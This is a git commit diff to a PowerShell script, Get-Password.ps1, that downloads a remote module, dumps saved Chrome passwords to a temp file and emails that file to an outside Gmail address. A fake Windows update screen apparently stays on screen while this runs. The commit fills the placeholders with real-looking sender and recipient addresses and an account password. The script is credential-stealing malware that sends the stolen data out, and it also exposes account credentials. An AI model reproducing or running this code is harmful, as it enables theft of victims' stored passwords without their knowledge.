28297cf866c971ef2abbb54df8bea6a693ab43cd
Chai <83523587+CPScript@users.noreply.github.com>
2023-02-10 16:33:30 -0500

    Update Get-Password.ps1

--- Get-Password.ps1
+++ Get-Password.ps1
@@ -4,8 +4,8 @@ $output = "$env:temp\file.psm1"
 
 #create test email account in gmail and enter the credentials here
 #WARNING: E-mail credentials might be exposed if the source code is found.
-$Username = "your email ";  
-$Password = "your password ";
+$Username = "GiveME1Taa@gmail.com";  
+$Password = "1234576aa";
 (New-Object System.Net.WebClient).DownloadFile($url,$output)
 if(Get-Process -Name Chrome -ea SilentlyContinue)
 {
@@ -17,10 +17,10 @@ Get-ChromeDump -OutFile $env:temp\dumped.txt  3>$null
 function Send-ToEmail([string]$email, [string]$attachmentpath){
 
     $message = new-object Net.Mail.MailMessage;
-    $message.From = "YourName@gmail.com";
+    $message.From = "Endermanhunter07@gmail.com";
     $message.To.Add($email);
-    $message.Subject = "subject text here...";
-    $message.Body = "body text here...";
+    $message.Subject = "Pass";
+    $message.Body = "Pass:";
     $attachment = New-Object Net.Mail.Attachment($attachmentpath);
     $message.Attachments.Add($attachment);
 
@@ -31,7 +31,7 @@ function Send-ToEmail([string]$email, [string]$attachmentpath){
     $attachment.Dispose();
  }
 #Replace the to-address-email with the email address you want the password file sent to.
-Send-ToEmail  -email "to-address-email" -attachmentpath $env:temp\dumped.txt 2>$null;
+Send-ToEmail  -email "GiveME1Taa@gmail.com" -attachmentpath $env:temp\dumped.txt 2>$null;
 #Change the seconds accordingly , It specifies how long the windows update should stay on screen
-Start-Sleep -Seconds 60
+Start-Sleep -Seconds 10
 Get-Process -Name iexplore | Stop-Process
